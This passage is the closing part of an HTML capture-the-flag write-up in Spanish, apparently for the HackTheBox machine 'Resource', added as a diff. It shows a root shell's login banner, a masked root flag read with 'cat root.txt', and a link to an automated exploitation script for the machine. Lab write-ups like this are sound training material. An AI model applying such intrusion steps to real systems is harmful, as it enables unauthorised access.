+<span id="cb32-20"><a href="#cb32-20" aria-hidden="true"></a><span class="st">  =&gt; / is using 88.1% of 10.73GB</span></span>
+<span id="cb32-21"><a href="#cb32-21" aria-hidden="true"></a></span>
+<span id="cb32-22"><a href="#cb32-22" aria-hidden="true"></a></span>
+<span id="cb32-23"><a href="#cb32-23" aria-hidden="true"></a><span class="st">Expanded Security Maintenance for Applications is not enabled.</span></span>
+<span id="cb32-24"><a href="#cb32-24" aria-hidden="true"></a></span>
+<span id="cb32-25"><a href="#cb32-25" aria-hidden="true"></a><span class="st">0 updates can be applied immediately.</span></span>
+<span id="cb32-26"><a href="#cb32-26" aria-hidden="true"></a></span>
+<span id="cb32-27"><a href="#cb32-27" aria-hidden="true"></a><span class="st">Enable ESM Apps to receive additional future security updates.</span></span>
+<span id="cb32-28"><a href="#cb32-28" aria-hidden="true"></a><span class="st">See https://ubuntu.com/esm or run: sudo pro status</span></span>
+<span id="cb32-29"><a href="#cb32-29" aria-hidden="true"></a></span>
+<span id="cb32-30"><a href="#cb32-30" aria-hidden="true"></a></span>
+<span id="cb32-31"><a href="#cb32-31" aria-hidden="true"></a><span class="st">The list of available updates is more than a week old.</span></span>
+<span id="cb32-32"><a href="#cb32-32" aria-hidden="true"></a><span class="st">To check for new updates run: sudo apt update</span></span>
+<span id="cb32-33"><a href="#cb32-33" aria-hidden="true"></a><span class="st">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span></span>
+<span id="cb32-34"><a href="#cb32-34" aria-hidden="true"></a></span>
+<span id="cb32-35"><a href="#cb32-35" aria-hidden="true"></a></span>
+<span id="cb32-36"><a href="#cb32-36" aria-hidden="true"></a><span class="st">root@ssg:~# </span></span></code></pre></div>
+<p>Y ya podemos ver la ultima flag.</p>
+<div class="sourceCode" id="cb33"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb33-1"><a href="#cb33-1" aria-hidden="true"></a><span class="ex">root@ssg</span>:~# cat root.txt </span>
+<span id="cb33-2"><a href="#cb33-2" aria-hidden="true"></a><span class="ex">229*****************************</span></span>
+<span id="cb33-3"><a href="#cb33-3" aria-hidden="true"></a><span class="ex">root@ssg</span>:~# </span></code></pre></div>
+
+<p>Aqui se explica con detalle el <a class="link" href="https://github.com/MrPr1ngl3s/AutoPWN/tree/main/HTB/Resource" target="_blank">AutoPWN</a> de la máquina Resource.</p>
+
+
+<hr />
+<p>© <script>document.write(new Date().getFullYear());</script> - Mr. Pr1ngl3s</p>
+
+
+  </div>
+</body>
+</html>
+
+
